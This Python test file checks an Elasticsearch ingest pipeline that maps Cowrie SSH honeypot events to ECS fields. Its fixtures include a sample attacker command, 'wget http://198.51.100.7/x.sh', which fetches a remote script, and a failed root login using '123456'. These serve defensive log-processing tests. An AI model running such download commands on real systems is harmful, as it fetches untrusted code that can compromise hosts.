import pytest
from elasticsearch import BadRequestError

from app.config import get_settings
from app.es.bootstrap import PIPELINE_ID, bootstrap_es
from app.es.client import get_es

COWRIE_COMMAND_EVENT = {
    "eventid": "cowrie.command.input",
    "timestamp": "2026-08-20T10:15:03.421000Z",
    "session": "a1b2c3d4e5f6",
    "src_ip": "185.220.101.44",
    "src_port": 51234,
    "dst_port": 2222,
    "input": "wget http://198.51.100.7/x.sh",
    "message": "CMD: wget http://198.51.100.7/x.sh",
    "sensor": "cowrie-01",
}

COWRIE_LOGIN_EVENT = {
    "eventid": "cowrie.login.failed",
    "timestamp": "2026-08-20T10:14:58.100000Z",
    "session": "a1b2c3d4e5f6",
    "src_ip": "185.220.101.44",
    "username": "root",
    "password": "123456",
}


async def _simulate(doc: dict) -> dict:
    await bootstrap_es()
    result = await get_es().ingest.simulate(
        id=PIPELINE_ID, docs=[{"_source": doc}]
    )
    entry = result["docs"][0]
    assert "error" not in entry, entry
    return entry["doc"]["_source"]


@pytest.mark.asyncio
async def test_command_event_maps_to_ecs() -> None:
    src = await _simulate(COWRIE_COMMAND_EVENT)

    assert src["source"]["ip"] == "185.220.101.44"
    assert src["source"]["port"] == 51234
    assert src["destination"]["port"] == 2222
    assert src["session"]["id"] == "a1b2c3d4e5f6"
    assert src["event"]["action"] == "cowrie.command.input"
    assert src["event"]["category"] == "process"
    assert src["process"]["command_line"] == "wget http://198.51.100.7/x.sh"
    assert src["@timestamp"].startswith("2026-08-20T10:15:03")
    assert "message" not in src
    assert "sensor" not in src


@pytest.mark.asyncio
async def test_login_event_maps_to_authentication_failure() -> None:
    src = await _simulate(COWRIE_LOGIN_EVENT)

    assert src["event"]["category"] == "authentication"
    assert src["event"]["outcome"] == "failure"
    assert src["credential"]["username"] == "root"
    assert src["user"]["name"] == "root"


@pytest.mark.asyncio
async def test_nested_cowrie_fields_from_filebeat_flatten_and_map_correctly() -> None:
    """Filebeat ships Cowrie's fields nested under "cowrie.*" (see
    infra/filebeat/filebeat.yml) rather than at document root, to avoid a
    field-name collision with Filebeat's own metadata. The pipeline's first
    processor flattens that namespace back onto the root before the
    rename/remove processors above run. This indexes a Filebeat-shaped
    document through the real pipeline (not just _simulate) and confirms the
    flattened, renamed fields land correctly in the real index."""
    await bootstrap_es()
    settings = get_settings()
    doc = {
        "cowrie": {
            "eventid": "cowrie.command.input",
            "session": "test-flatten-nested",
            "input": "id",
            "src_ip": "203.0.113.9",
            "timestamp": "2026-08-20T10:15:03.421000Z",
        },
        "honeypot": {"id": "cowrie-01", "name": "Cowrie SSH (med-ws-04)"},
        "labels": {"seeded": True},
    }
    resp = await get_es().index(
        index=settings.es_index, document=doc, pipeline=PIPELINE_ID, refresh=True
    )
    fetched = await get_es().get(index=settings.es_index, id=resp["_id"])
    src = fetched["_source"]

    assert src["process"]["command_line"] == "id"
    assert src["session"]["id"] == "test-flatten-nested"
    assert src["source"]["ip"] == "203.0.113.9"
    assert src["honeypot"]["id"] == "cowrie-01"
    assert "cowrie" not in src


@pytest.mark.asyncio
async def test_unrecognized_cowrie_field_is_rejected_not_silently_dropped() -> None:
    """dynamic:strict must be the fail-loud backstop for any Cowrie field that
    is neither promoted (renamed) nor recognised as noise (removed) by the
    pipeline. A prior version of infra/filebeat/filebeat.yml dropped Filebeat's
    entire nested "cowrie" namespace itself after promoting a hand-picked list
    of fields, which meant an unlisted field vanished silently -- no error,
    no log line. It must instead surface as a strict_dynamic_mapping_exception
    that names the offending field, exactly like the "uuid" field did the
    first time live Cowrie traffic hit this pipeline."""
    await bootstrap_es()
    settings = get_settings()
    doc = {
        "cowrie": {
            "eventid": "cowrie.command.input",
            "session": "test-strict-mapping",
            "input": "ls",
            "mystery_field": "should not silently vanish",
        }
    }

    with pytest.raises(BadRequestError) as exc_info:
        await get_es().index(index=settings.es_index, document=doc, pipeline=PIPELINE_ID)

    message = str(exc_info.value)
    assert "strict_dynamic_mapping_exception" in message
    assert "mystery_field" in message
